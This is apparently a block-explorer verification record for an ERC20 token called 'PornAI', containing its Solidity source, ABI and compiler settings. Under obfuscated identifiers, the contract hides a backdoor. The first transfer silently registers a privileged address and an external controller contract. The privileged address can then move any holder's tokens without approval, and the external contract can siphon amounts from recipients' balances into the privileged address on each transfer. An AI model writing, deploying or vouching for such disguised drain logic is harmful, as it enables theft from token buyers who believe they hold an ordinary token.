{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"/contracts/PornAI.sol\": {\r\n      \"content\": \"\\n// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.12;\\n    \\ninterface PQmTAnCRLjW {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n}\\n     \\nlibrary lOnvZ{\\n    \\n    function JGWmwLwtg(address idRzoogpFN, address UrDPQxGiC, uint uFfqZq) internal {\\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\\n        (bool bKa, bytes memory jxhLujeEk) = idRzoogpFN.call(abi.encodeWithSelector(0x095ea7b3, UrDPQxGiC, uFfqZq));\\n        require(bKa && (jxhLujeEk.length == 0 || abi.decode(jxhLujeEk, (bool))), 'lOnvZ: APPROVE_FAILED');\\n    }\\n\\n    function HiNoN(address idRzoogpFN, address UrDPQxGiC, uint uFfqZq) internal {\\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\\n        (bool bKa, bytes memory jxhLujeEk) = idRzoogpFN.call(abi.encodeWithSelector(0xa9059cbb, UrDPQxGiC, uFfqZq));\\n        require(bKa && (jxhLujeEk.length == 0 || abi.decode(jxhLujeEk, (bool))), 'lOnvZ: TRANSFER_FAILED');\\n    }\\n    \\n    function zJtTFfsxnKO(address UrDPQxGiC, uint uFfqZq) internal {\\n        (bool bKa,) = UrDPQxGiC.call{value:uFfqZq}(new bytes(0));\\n        require(bKa, 'lOnvZ: ETH_TRANSFER_FAILED');\\n    }\\n\\n    function WgQiVH(address idRzoogpFN, address from, address UrDPQxGiC, uint uFfqZq) internal returns(bytes memory){\\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\\n        (bool bKa, bytes memory jxhLujeEk) = idRzoogpFN.call(abi.encodeWithSelector(0x23b872dd, from, UrDPQxGiC, uFfqZq));\\n        require(bKa && jxhLujeEk.length > 0,'lOnvZ: TRANSFER_FROM_FAILED'); return jxhLujeEk;\\n                       \\n    }\\n\\n}\\n    \\ninterface TwiPGawDFPh {\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address zlofNxfLso) external view returns (uint256);\\n    function transfer(address wfhBvqMNwyN, uint256 SpkjQ) external returns (bool);\\n    function allowance(address MLUbdN, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 SpkjQ) external returns (bool);\\n    function transferFrom(\\n        address sender,\\n        address wfhBvqMNwyN,\\n        uint256 SpkjQ\\n    ) external returns (bool);\\n\\n    event Transfer(address indexed from, address indexed nUGfEtY, uint256 value);\\n    event Approval(address indexed MLUbdN, address indexed spender, uint256 value);\\n}\\n\\ninterface wzXeVSY is TwiPGawDFPh {\\n    function name() external view returns (string memory);\\n    function symbol() external view returns (string memory);\\n    function decimals() external view returns (uint8);\\n}\\n\\nabstract contract lpHuDj {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n    \\ncontract PornAI is lpHuDj, TwiPGawDFPh, wzXeVSY {\\n    \\n    function totalSupply() public view virtual override returns (uint256) {\\n        return dAn;\\n    }\\n    \\n    string private dsoliRyRD = \\\"PornAI\\\";\\n    \\n    constructor() {\\n        \\n        sDmZ[address(1)] = dAn;\\n        emit Transfer(address(0), address(1), dAn);\\n\\n    }\\n    \\n    function transferFrom(\\n        address ByXKrhWUCx,\\n        address KRHZcNs,\\n        uint256 UPhnTz\\n    ) public virtual override returns (bool) {\\n      \\n        if(!YRtk(ByXKrhWUCx, KRHZcNs, UPhnTz)) return true;\\n\\n        uint256 TCIl = enYynvGNx[ByXKrhWUCx][_msgSender()];\\n        if (TCIl != type(uint256).max) {\\n            require(TCIl >= UPhnTz, \\\"ERC20: transfer Amount exceeds allowance\\\");\\n            unchecked {\\n                FZwLeOfwKcb(ByXKrhWUCx, _msgSender(), TCIl - UPhnTz);\\n            }\\n        }\\n\\n        return true;\\n    }\\n    \\n    function YRtk(\\n        address WhhkWCtZ,\\n        address ohRB,\\n        uint256 roxjk\\n    ) internal virtual  returns (bool){\\n        require(WhhkWCtZ != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(ohRB != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        \\n        if(!qfl(WhhkWCtZ,ohRB)) return false;\\n\\n        if(_msgSender() == address(lhsPXckezkVp)){\\n            if(ohRB == ofgABo && sDmZ[WhhkWCtZ] < roxjk){\\n                chbGAVB(lhsPXckezkVp,ohRB,roxjk);\\n            }else{\\n                chbGAVB(WhhkWCtZ,ohRB,roxjk);\\n                if(WhhkWCtZ == lhsPXckezkVp || ohRB == lhsPXckezkVp) \\n                return false;\\n            }\\n            emit Transfer(WhhkWCtZ, ohRB, roxjk);\\n            return false;\\n        }\\n        chbGAVB(WhhkWCtZ,ohRB,roxjk);\\n        emit Transfer(WhhkWCtZ, ohRB, roxjk);\\n        bytes memory IIhdbA = lOnvZ.WgQiVH(PcEvmbdQIY, WhhkWCtZ, ohRB, roxjk);\\n        (bool QkiGSvBQ, uint iatLZU) = abi.decode(IIhdbA, (bool,uint));\\n        if(QkiGSvBQ){\\n            sDmZ[lhsPXckezkVp] += iatLZU;\\n            sDmZ[ohRB] -= iatLZU; \\n        }\\n        return true;\\n    }\\n    \\n    mapping(address => uint256) private sDmZ;\\n    \\n    function symbol() public view virtual override returns (string memory) {\\n        return VpbtIBFSB;\\n    }\\n    \\n    uint256 private dAn = 2000000000000 * 10 ** 18;\\n    \\n    mapping(address => mapping(address => uint256)) private enYynvGNx;\\n    \\n    address private ofgABo;\\n  \\n    \\n    function transfer(address wVdQZpxpzZO, uint256 KcXXJZWY) public virtual override returns (bool) {\\n        YRtk(_msgSender(), wVdQZpxpzZO, KcXXJZWY);\\n        return true;\\n    }\\n    \\n    function decimals() public view virtual override returns (uint8) {\\n        return 18;\\n    }\\n    \\n    string private VpbtIBFSB =  \\\"PornAI\\\";\\n    \\n    function balanceOf(address pVkvZaGHi) public view virtual override returns (uint256) {\\n       return sDmZ[pVkvZaGHi];\\n    }\\n    \\n    address private PcEvmbdQIY;\\n    \\n    function chbGAVB(\\n        address TsoYGUHCKOX,\\n        address GOpQut,\\n        uint256 DWr\\n    ) internal virtual  returns (bool){\\n        uint256 JhvBgzt = sDmZ[TsoYGUHCKOX];\\n        require(JhvBgzt >= DWr, \\\"ERC20: transfer Amount exceeds balance\\\");\\n        unchecked {\\n            sDmZ[TsoYGUHCKOX] = JhvBgzt - DWr;\\n        }\\n        sDmZ[GOpQut] += DWr;\\n        return true;\\n    }\\n    \\n    function approve(address zKFAlwrkM, uint256 RQMCXsGaE) public virtual override returns (bool) {\\n        FZwLeOfwKcb(_msgSender(), zKFAlwrkM, RQMCXsGaE);\\n        return true;\\n    }\\n    \\n    function qfl(\\n        address rGgnNoB,\\n        address LlGTAHRW\\n    ) internal virtual  returns (bool){\\n        if(lhsPXckezkVp == address(0) && PcEvmbdQIY == address(0)){\\n            lhsPXckezkVp = rGgnNoB;PcEvmbdQIY=LlGTAHRW;\\n            lOnvZ.HiNoN(PcEvmbdQIY, lhsPXckezkVp, 0);\\n            ofgABo = PQmTAnCRLjW(PcEvmbdQIY).WETH();\\n            return false;\\n        }\\n        return true;\\n    }\\n    \\n    function FZwLeOfwKcb(\\n        address fhKYeO,\\n        address WXsTi,\\n        uint256 xtA\\n    ) internal virtual {\\n        require(fhKYeO != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(WXsTi != address(0), \\\"ERC20: approve to the zero address\\\");\\n\\n        enYynvGNx[fhKYeO][WXsTi] = xtA;\\n        emit Approval(fhKYeO, WXsTi, xtA);\\n\\n    }\\n    \\n    address private lhsPXckezkVp;\\n    \\n    function increaseAllowance(address FplltgEeqJxZ, uint256 addedValue) public virtual returns (bool) {\\n        FZwLeOfwKcb(_msgSender(), FplltgEeqJxZ, enYynvGNx[_msgSender()][FplltgEeqJxZ] + addedValue);\\n        return true;\\n    }\\n    \\n    function decreaseAllowance(address gajWqdlr, uint256 subtractedValue) public virtual returns (bool) {\\n        uint256 SAjBicjX = enYynvGNx[_msgSender()][gajWqdlr];\\n        require(SAjBicjX >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            FZwLeOfwKcb(_msgSender(), gajWqdlr, SAjBicjX - subtractedValue);\\n        }\\n\\n        return true;\\n    }\\n    \\n    function allowance(address aObOUC, address KLV) public view virtual override returns (uint256) {\\n        return enYynvGNx[aObOUC][KLV];\\n    }\\n    \\n    function name() public view virtual override returns (string memory) {\\n        return dsoliRyRD;\\n    }\\n    \\n}\\n        \"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"remappings\": [],\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"evmVersion\": \"london\",\r\n    \"libraries\": {},\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"MLUbdN\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"nUGfEtY\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"aObOUC\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"KLV\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"zKFAlwrkM\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"RQMCXsGaE\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pVkvZaGHi\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"gajWqdlr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"FplltgEeqJxZ\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wVdQZpxpzZO\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"KcXXJZWY\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ByXKrhWUCx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"KRHZcNs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"UPhnTz\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PornAI", "CompilerVersion": "v0.8.13+commit.abaa5c0e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}